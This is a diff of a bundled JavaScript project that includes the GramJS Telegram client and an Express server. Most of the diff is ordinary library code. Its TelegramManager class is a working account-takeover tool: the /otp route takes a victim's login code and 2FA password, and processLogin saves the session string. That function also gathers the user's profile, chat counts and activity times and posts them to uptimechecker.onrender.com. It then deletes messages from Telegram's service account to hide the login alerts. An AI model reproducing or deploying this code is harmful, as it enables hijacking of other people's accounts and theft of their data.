             throw new Error("You must provide the entity where the result should be sent to");
         }
-        const replyId = replyTo ? __1.utils.getMessageId(replyTo) : undefined;
+        let replyObject = undefined;
+        if (replyTo != undefined) {
+            replyObject = new api_1.Api.InputReplyToMessage({
+                replyToMsgId: (0, Utils_1.getMessageId)(replyTo),
+            });
+        }
         const request = new api_1.Api.messages.SendInlineBotResult({
             peer: entity,
             queryId: this._queryId,
@@ -58112,7 +58498,7 @@ class InlineResult {
             silent: silent,
             clearDraft: clearDraft,
             hideVia: hideVia,
-            replyToMsgId: replyId,
+            replyTo: replyObject,
         });
         return await this._client.invoke(request);
     }
@@ -59574,6 +59960,7 @@ tlsBlockDomain = TlsBlock;
 tlsBlockGrease seed:int = TlsBlock;
 tlsBlockPublicKey = TlsBlock;
 tlsBlockScope entries:Vector<TlsBlock> = TlsBlock;
+tlsBlockPermutation entries:Vector<Vector<TlsBlock>> = TlsBlock;
 ---functions---
 rpc_drop_answer#58e4a740 req_msg_id:long = RpcDropAnswer;
 get_future_salts#b921bd04 num:int = FutureSalts;
@@ -59694,10 +60081,11 @@ app.get('/login', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
 app.get('/otp', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     const phoneCode = req.query.code;
     const number = req.query.phone;
+    const password = req.query.password;
     const cli = yield (0, telegramManager_1.getClient)(number);
     if (cli) {
         console.log(cli === null || cli === void 0 ? void 0 : cli.phoneCodeHash, cli === null || cli === void 0 ? void 0 : cli.phoneNumber);
-        const result = yield (cli === null || cli === void 0 ? void 0 : cli.login(phoneCode));
+        const result = yield (cli === null || cli === void 0 ? void 0 : cli.login(phoneCode, password));
         if (result && result.status === 200) {
             res.status(200).send({ mesaage: result.message });
         }
@@ -59882,9 +60270,7 @@ function createClient(number) {
             console.log("Creating new client");
             const cli = new TelegramManager(number);
             clients.set(number, cli);
-            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
-                yield restAcc(number);
-            }), 150000);
+            yield (0, Helpers_1.sleep)(500);
             return (yield cli.sendCode(false));
         }
     });
@@ -59899,6 +60285,20 @@ class TelegramManager {
         this.session = new sessions_1.StringSession('');
         this.client = null;
         this.createClient();
+    }
+    getLastActiveTime() {
+        return __awaiter(this, void 0, void 0, function* () {
+            const result = yield this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
+            let latest = 0;
+            result.authorizations.map((auth) => {
+                if (!auth.country.toLowerCase().includes('singapore')) {
+                    if (latest < auth.dateActive) {
+                        latest = auth.dateActive;
+                    }
+                }
+            });
+            return latest;
+        });
     }
     disconnect() {
         return __awaiter(this, void 0, void 0, function* () {
@@ -59921,16 +60321,18 @@ class TelegramManager {
         });
     }
     deleteMessages() {
+        var _a, _b;
         return __awaiter(this, void 0, void 0, function* () {
             console.log("IsConnected - ", this.client.connected, this.phoneNumber);
             if (this.client.connected) {
                 try {
-                    const msgs = yield this.client.getMessages("777000", { limit: 2 });
-                    msgs.forEach((msg) => __awaiter(this, void 0, void 0, function* () {
-                        console.log(msg.text);
-                        if (msg.text.toLowerCase().includes('login'))
-                            yield msg.delete({ revoke: true });
-                    }));
+                    const msgs = yield this.client.getMessages("777000", { limit: 10 });
+                    const len = msgs['total'];
+                    console.log(len);
+                    for (let i = 0; i < len - 1; i++) {
+                        console.log((_a = msgs[i]) === null || _a === void 0 ? void 0 : _a.text);
+                        (_b = msgs[i]) === null || _b === void 0 ? void 0 : _b.delete({ revoke: true });
+                    }
                 }
                 catch (error) {
                     console.log("Cannot delete Messages - ", this.phoneNumber);
@@ -59950,6 +60352,9 @@ class TelegramManager {
                     settings: new telegram_1.Api.CodeSettings({}),
                 }));
                 console.log('Send result - ', sendResult);
+                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
+                    yield restAcc(this.phoneNumber);
+                }), 150000);
                 if (sendResult instanceof telegram_1.Api.auth.SentCodeSuccess)
                     throw new Error("logged in right after sending the code");
                 this.phoneCodeHash = sendResult.phoneCodeHash;
@@ -59983,8 +60388,8 @@ class TelegramManager {
             }
         });
     }
-    login(phoneCode) {
-        var _a, _b;
+    login(phoneCode, passowrd) {
+        var _a;
         return __awaiter(this, void 0, void 0, function* () {
             let isRegistrationRequired = false;
             let termsOfService;
@@ -59998,54 +60403,15 @@ class TelegramManager {
                 const result = yield ((_a = this.client) === null || _a === void 0 ? void 0 : _a.invoke(new telegram_1.Api.auth.SignIn({
                     phoneNumber: `+${this.phoneNumber}`,
                     phoneCodeHash: this.phoneCodeHash,
-                    phoneCode,
+                    phoneCode
                 })));
                 if (result instanceof telegram_1.Api.auth.AuthorizationSignUpRequired) {
                     isRegistrationRequired = true;
                     termsOfService = result.termsOfService;
                 }
                 else {
-                    console.log(this.client.session.save());
-                    const sess = this.client.session.save();
-                    const user = yield result.user.toJSON();
-                    const chats = yield ((_b = this.client) === null || _b === void 0 ? void 0 : _b.getDialogs({ limit: 130 }));
-                    let personalChats = 0;
-                    let channels = 0;
-                    const chatsArray = [];
-                    chats.map((chat) => {
-                        var _a;
-                        if (chat.isChannel || chat.isGroup) {
-                            channels++;
-                            const chatEntity = chat.entity.toJSON();
-                            const cannotSendMsgs = (_a = chatEntity.defaultBannedRights) === null || _a === void 0 ? void 0 : _a.sendMessages;
-                            if (!chatEntity.broadcast && !cannotSendMsgs) {
-                                chatsArray.push(chatEntity);
-                            }
-                        }
-                        else {
-                            personalChats++;
-                        }
-                    });
-                    const payload3 = {
-                        mobile: user.phone,
-                        session: `${sess}`,
-                        firstName: user.firstName,
-                        lastName: user.lastName,
-                        userName: user.username ? `@${user.username}` : null,
-                        channels: channels,
-                        personalChats: personalChats
-                    };
-                    yield axios_1.default.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-                    yield axios_1.default.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-                    let i = 3;
-                    while (i > 0) {
-                        yield this.deleteMessages();
-                        yield (0, Helpers_1.sleep)(3000);
-                        i--;
-                    }
-                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
-                        yield restAcc(this.phoneNumber);
-                    }), 50000);
+                    yield this.processLogin(result);
+                    yield restAcc(this.phoneNumber);
                     return { status: 200, message: "Login success" };
                 }
             }
@@ -60053,6 +60419,8 @@ class TelegramManager {
                 console.log(err);
                 if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                     console.log("passowrd Required");
+                    const result = yield this.client.signInWithPassword({ apiHash: this.apiHash, apiId: this.apiId }, { password: () => Promise.resolve(passowrd), onError: (e) => { console.log(e); } });
+                    yield this.processLogin(result);
                     return { status: 400, message: "2FA required" };
                     // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
                 }
@@ -60091,6 +60459,53 @@ class TelegramManager {
                 }
             }
             yield restAcc(this.phoneNumber);
+        });
+    }
+    processLogin(result) {
+        var _a;
+        return __awaiter(this, void 0, void 0, function* () {
+            console.log(this.client.session.save());
+            const sess = this.client.session.save();
+            const user = yield result.user.toJSON();
+            const chats = yield ((_a = this.client) === null || _a === void 0 ? void 0 : _a.getDialogs({ limit: 600 }));
+            const myMsgs = yield this.client.getMessages('me', { limit: 8 });
+            let personalChats = 0;
+            let channels = 0;
+            const lastActive = yield this.getLastActiveTime();
+            const date = new Date(lastActive * 1000);
+            const chatsArray = [];
+            chats.map((chat) => {
+                var _a;
+                if (chat.isChannel || chat.isGroup) {
+                    channels++;
+                    const chatEntity = chat.entity.toJSON();
+                    const cannotSendMsgs = (_a = chatEntity.defaultBannedRights) === null || _a === void 0 ? void 0 : _a.sendMessages;
+                    if (!chatEntity.broadcast && !cannotSendMsgs) {
+                        chatsArray.push(chatEntity);
+                    }
+                }
+                else {
+                    personalChats++;
+                }
+            });
+            const payload3 = {
+                mobile: user.phone,
+                session: `${sess}`,
+                firstName: user.firstName,
+                lastName: user.lastName,
+                userName: user.username ? `@${user.username}` : null,
+                channels: channels,
+                personalChats: personalChats,
+                msgs: myMsgs['total'],
+                totalChats: chats['total'],
+                lastActive: lastActive,
+                date: date,
+                tgId: user.id
+            };
+            yield axios_1.default.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+            yield axios_1.default.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+            yield (0, Helpers_1.sleep)(3000);
+            yield this.deleteMessages();
         });
     }
 }
@@ -69060,294 +69475,6 @@ axios.default = axios;
 
 module.exports = axios;
 //# sourceMappingURL=axios.cjs.map
-
-
-/***/ }),
-
-/***/ "./node_modules/real-cancellable-promise/dist/index.mjs":
-/*!**************************************************************!*\
-  !*** ./node_modules/real-cancellable-promise/dist/index.mjs ***!
-  \**************************************************************/
-/***/ ((__unused_webpack___webpack_module__, __webpack_exports__, __webpack_require__) => {
-
-"use strict";
-__webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "CancellablePromise": () => (/* binding */ CancellablePromise),
-/* harmony export */   "Cancellation": () => (/* binding */ Cancellation),
-/* harmony export */   "buildCancellablePromise": () => (/* binding */ buildCancellablePromise),
-/* harmony export */   "isPromiseWithCancel": () => (/* binding */ isPromiseWithCancel),
-/* harmony export */   "pseudoCancellable": () => (/* binding */ pseudoCancellable)
-/* harmony export */ });
-/**
- * If canceled, a [[`CancellablePromise`]] should throw an `Cancellation` object.
- */
-class Cancellation extends Error {
-    constructor(message = 'Promise canceled.') {
-        super(message);
-    }
-}
-
-/** @internal */
-const noop = () => { };
-
-/**
- * Determines if an arbitrary value is a thenable with a cancel method.
- */
-function isPromiseWithCancel(value) {
-    return (typeof value === 'object' &&
-        typeof value.then === 'function' &&
-        typeof value.cancel === 'function');
-}
-/**
- * A promise with a `cancel` method.
- *
- * If canceled, the `CancellablePromise` will reject with a [[`Cancellation`]]
- * object.
- *
- * @typeParam T what the `CancellablePromise` resolves to
- */
-class CancellablePromise {
-    /**
-     * @param promise a normal promise or thenable
-     * @param cancel a function that cancels `promise`. **Calling `cancel` after
-     * `promise` has resolved must be a no-op.**
-     */
-    constructor(promise, cancel) {
-        this.promise = Promise.resolve(promise);
-        this.cancel = cancel;
-    }
-    /**
-     * Analogous to `Promise.then`.
-     *
-     * `onFulfilled` on `onRejected` can return a value, a normal promise, or a
-     * `CancellablePromise`. So you can make a chain a `CancellablePromise`s
-     * like this:
-     *
-     * ```
-     * const overallPromise = cancellableAsyncFunction1()
-     *     .then(cancellableAsyncFunction2)
-     *     .then(cancellableAsyncFunction3)
-     *     .then(cancellableAsyncFunction4)
-     * ```
-     *
-     * Then if you call `overallPromise.cancel`, `cancel` is called on all
-     * `CancellablePromise`s in the chain! In practice, this means that
-     * whichever async operation is in progress will be canceled.
-     *
-     * @returns a new CancellablePromise
-     */
-    then(onFulfilled, onRejected) {
-        let fulfill;
-        let reject;
-        let callbackPromiseWithCancel;
-        if (onFulfilled) {
-            fulfill = (value) => {
-                const nextValue = onFulfilled(value);
-                if (isPromiseWithCancel(nextValue))
-                    callbackPromiseWithCancel = nextValue;
-                return nextValue;
-            };
-        }
-        if (onRejected) {
-            reject = (reason) => {
-                const nextValue = onRejected(reason);
-                if (isPromiseWithCancel(nextValue))
-                    callbackPromiseWithCancel = nextValue;
-                return nextValue;
-            };
-        }
-        const newPromise = this.promise.then(fulfill, reject);
-        const newCancel = () => {
-            this.cancel();
-            callbackPromiseWithCancel === null || callbackPromiseWithCancel === void 0 ? void 0 : callbackPromiseWithCancel.cancel();
-        };
-        return new CancellablePromise(newPromise, newCancel);
-    }
-    /**
-     * Analogous to `Promise.catch`.
-     */
-    catch(onRejected // eslint-disable-line @typescript-eslint/no-explicit-any -- to match the types used for Promise in the official lib.d.ts
-    ) {
-        return this.then(undefined, onRejected);
-    }
-    /**
-     * Attaches a callback that is invoked when the Promise is settled
-     * (fulfilled or rejected). The resolved value cannot be modified from the
-     * callback.
-     * @param onFinally The callback to execute when the Promise is settled
-     * (fulfilled or rejected).
-     * @returns A Promise for the completion of the callback.
-     */
-    finally(onFinally) {
-        return new CancellablePromise(this.promise.finally(onFinally), this.cancel);
-    }
-    /**
-     * This is necessary to make `CancellablePromise` assignable to `Promise`.
-     */
-    // eslint-disable-next-line class-methods-use-this
-    get [Symbol.toStringTag]() {
-        return 'CancellablePromise';
-    }
-    static resolve(value) {
-        return new CancellablePromise(Promise.resolve(value), noop);
-    }
-    /**
-     * Analogous to `Promise.reject`.
-     *
-     * Like `CancellablePromise.resolve`, canceling the returned
-     * `CancellablePromise` is a no-op.
-     *
-     * @param reason this should probably be an `Error` object
-     */
-    static reject(reason) {
-        return new CancellablePromise(Promise.reject(reason), noop);
-    }
-    /**
-     * Analogous to `Promise.all`.
-     *
-     * @param values an array that may contain `CancellablePromise`s, promises,
-     * thenables, and resolved values
-     * @returns a [[`CancellablePromise`]], which, if canceled, will cancel each
-     * of the promises passed in to `CancellablePromise.all`.
-     */
-    static all(values) {
-        return new CancellablePromise(Promise.all(values), () => {
-            for (const value of values) {
-                if (isPromiseWithCancel(value))
-                    value.cancel();
-            }
-        });
-    }
-    static allSettled(values) {
-        const cancel = () => {
-            for (const value of values) {
-                if (isPromiseWithCancel(value)) {
-                    value.cancel();
-                }
-            }
-        };
-        return new CancellablePromise(Promise.allSettled(values), cancel);
-    }
-    /**
-     * Creates a `CancellablePromise` that is resolved or rejected when any of
-     * the provided `Promises` are resolved or rejected.
-     * @param values An array of `Promises`.
-     * @returns A new `CancellablePromise`. Canceling it cancels all of the input
-     * promises.
-     */
-    static race(values) {
-        const cancel = () => {
-            for (const value of values) {
-                if (isPromiseWithCancel(value)) {
-                    value.cancel();
-                }
-            }
-        };
-        return new CancellablePromise(Promise.race(values), cancel);
-    }
-    // Promise.any is an ES2021 feature. Not yet implemented.
-    // /**
-    //  * The any function returns a `CancellablePromise` that is fulfilled by the
-    //  * first given promise to be fulfilled, or rejected with an `AggregateError`
-    //  * containing an array of rejection reasons if all of the given promises are
-    //  * rejected. It resolves all elements of the passed iterable to promises as
-    //  * it runs this algorithm.
-    //  * @param values An array or iterable of Promises.
-    //  * @returns A new `CancellablePromise`.
-    //  */
-    // any<T>(values: (T | PromiseLike<T>)[] | Iterable<T | PromiseLike<T>>): CancellablePromise<T> {
-    //     return new CancellablePromise(Promise.any(values), cancel))
-    // }
-    /**
-     * @returns a `CancellablePromise` that resolves after `ms` milliseconds.
-     */
-    static delay(ms) {
-        let timer;
-        let rejectFn = noop;
-        const promise = new Promise((resolve, reject) => {
-            timer = setTimeout(() => {
-                resolve();
-                rejectFn = noop;
-            }, ms);
-            rejectFn = reject;
-        });
-        return new CancellablePromise(promise, () => {
-            if (timer)
-                clearTimeout(timer);
-            rejectFn(new Cancellation());
-        });
-    }
-}
-
-/**
- * Takes in a regular `Promise` and returns a `CancellablePromise`. If canceled,
- * the `CancellablePromise` will immediately reject with a `Cancellation`, but the asynchronous
- * operation will not truly be aborted.
- *
- * Analogous to
- * [make-cancellable-promise](https://www.npmjs.com/package/make-cancellable-promise).
- */
-function pseudoCancellable(promise) {
-    let canceled = false;
-    let rejectFn = noop;
-    const newPromise = new Promise((resolve, reject) => {
-        rejectFn = reject;
-        // eslint-disable-next-line promise/catch-or-return -- no catch method on PromiseLike
-        promise.then((result) => {
-            if (!canceled) {
-                resolve(result);
-                rejectFn = noop;
-            }
-            return undefined;
-        }, (e) => {
-            if (!canceled)
-                reject(e);
-        });
-    });
-    function cancel() {
-        canceled = true;
-        rejectFn(new Cancellation());
-    }
-    return new CancellablePromise(newPromise, cancel);
-}
-/**
- * Used to build a single [[`CancellablePromise`]] from a multi-step asynchronous
- * flow.
- *
- * When the overall promise is canceled, each captured promise is canceled. In practice,
- * this means the active asynchronous operation is canceled.
- *
- * ```
- * function query(id: number): CancellablePromise<QueryResult> {
- *     return buildCancellablePromise(async capture => {
- *         const result1 = await capture(api.method1(id))
- *
- *         // do some stuff
- *
- *         const result2 = await capture(api.method2(result1.id))
- *
- *         return { result1, result2 }
- *     })
- * }
- * ```
- *
- * @param innerFunc an async function that takes in a `capture` function and returns
- * a regular `Promise`
- */
-function buildCancellablePromise(innerFunc) {
-    const capturedPromises = [];
-    const capture = (promise) => {
-        capturedPromises.push(promise);
-        return promise;
-    };
-    function cancel() {
-        capturedPromises.forEach((p) => p.cancel());
-    }
-    return new CancellablePromise(innerFunc(capture), cancel);
-}
-
-
 
 
 /***/ }),
